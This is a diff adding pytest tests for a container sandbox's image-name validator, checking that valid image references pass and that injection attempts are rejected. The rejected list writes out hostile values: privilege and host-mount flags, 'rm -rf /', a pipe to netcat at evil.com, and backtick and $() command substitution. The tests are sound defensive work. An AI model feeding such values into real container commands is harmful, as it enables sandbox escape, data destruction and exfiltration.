@@ -198,6 +198,41 @@ class TestContainerSandbox:
         with pytest.raises(ConfigError, match="Dockerfile 'nonexistent' not found"):
             ContainerSandbox._build_dockerfile("nonexistent", "docker")
 
+    def test_validate_image_name_valid(self):
+        valid_images = [
+            "ubuntu:latest",
+            "gcc:12.2",
+            "python:3-slim",
+            "docker.io/library/alpine:3.18",
+            "ghcr.io/org/repo/app:v1.0.0",
+            "localhost:5000/custom-img:latest",
+            "alpine@sha256:e7d88de73db3d3a9418d76fb8f20a1377e59e651e6bdd7a666acdbd84bf960bc",
+        ]
+        for img in valid_images:
+            assert ContainerSandbox.validate_image_name(img) == img
+
+    def test_validate_image_name_injection_rejected(self):
+        malicious_images = [
+            "--privileged",
+            "-v /:/host ubuntu",
+            "--network host alpine",
+            "ubuntu; rm -rf /",
+            "alpine | nc evil.com 1337",
+            "image`whoami`",
+            "image$(id)",
+            "image name with spaces",
+            "",
+            "   ",
+        ]
+        for bad_img in malicious_images:
+            with pytest.raises(ConfigError, match="Invalid container image|cannot be empty"):
+                ContainerSandbox.validate_image_name(bad_img)
+
+    def test_wrap_command_rejects_injected_image(self, monkeypatch):
+        monkeypatch.setattr(ContainerSandbox, "_get_engine", lambda: "docker")
+        with pytest.raises(ConfigError, match="Invalid container image"):
+            ContainerSandbox.wrap_command(["echo", "1"], sandbox_cfg={"image": "--privileged ubuntu"})
+
 
 class TestComposeSandbox:
     def test_compose_setup_and_teardown(self, monkeypatch):
